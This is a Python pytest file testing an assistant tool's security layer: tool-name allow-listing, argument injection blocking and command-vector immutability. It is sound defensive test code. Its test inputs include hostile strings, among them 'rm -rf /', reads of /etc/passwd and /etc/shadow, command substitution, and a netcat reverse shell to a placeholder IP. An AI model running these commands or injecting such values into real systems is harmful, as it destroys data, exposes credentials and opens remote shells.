"""Tests for security validation, allow-list enforcement, and injection prevention."""
import pytest
from hw_assistant.core.security import (
    validate_tool_name,
    sanitize_argument_value,
    get_command_vector,
    SecurityValidationError,
    ALLOW_LISTED_TOOLS,
)


def test_allowed_tools_pass():
    for tool_name in ALLOW_LISTED_TOOLS:
        validate_tool_name(tool_name)


def test_disallowed_tool_blocked():
    disallowed = [
        "run_bash",
        "rm_rf",
        "cat_etc_shadow",
        "exec_cmd",
        "curl_upload",
        "get_memory_slots; rm -rf /",
    ]
    for bad_tool in disallowed:
        with pytest.raises(SecurityValidationError, match="Blocked unauthorized tool call"):
            validate_tool_name(bad_tool)


@pytest.mark.parametrize(
    "malicious_input",
    [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| nc -e /bin/sh 1.2.3.4 4444",
        "$(whoami)",
        "`id`",
        "../etc/shadow",
        "> /dev/null",
        "< /dev/urandom",
        "--evil-flag",
        "-f",
    ],
)
def test_argument_injection_patterns_blocked(malicious_input):
    with pytest.raises(SecurityValidationError, match="Malicious parameter detected"):
        sanitize_argument_value("device", malicious_input)


def test_valid_arguments_pass():
    # Booleans
    sanitize_argument_value("include_empty_slots", True)
    sanitize_argument_value("include_empty_slots", False)
    # Integers / floats
    sanitize_argument_value("timeout", 10)
    sanitize_argument_value("limit", 2.5)
    # Safe string
    sanitize_argument_value("device", "nvme0n1")


def test_unsupported_argument_types_blocked():
    with pytest.raises(SecurityValidationError, match="Unsupported parameter type"):
        sanitize_argument_value("payload", {"__proto__": "polluted"})

    with pytest.raises(SecurityValidationError, match="Unsupported parameter type"):
        sanitize_argument_value("list_arg", ["item1", "item2"])


def test_get_command_vector_returns_immutable_copy():
    cmd = get_command_vector("get_cpu_info", {})
    assert cmd == ["lscpu"]
    cmd.append("--malicious-flag")
    # Underlying allow-list must remain intact
    fresh_cmd = get_command_vector("get_cpu_info", {})
    assert fresh_cmd == ["lscpu"]
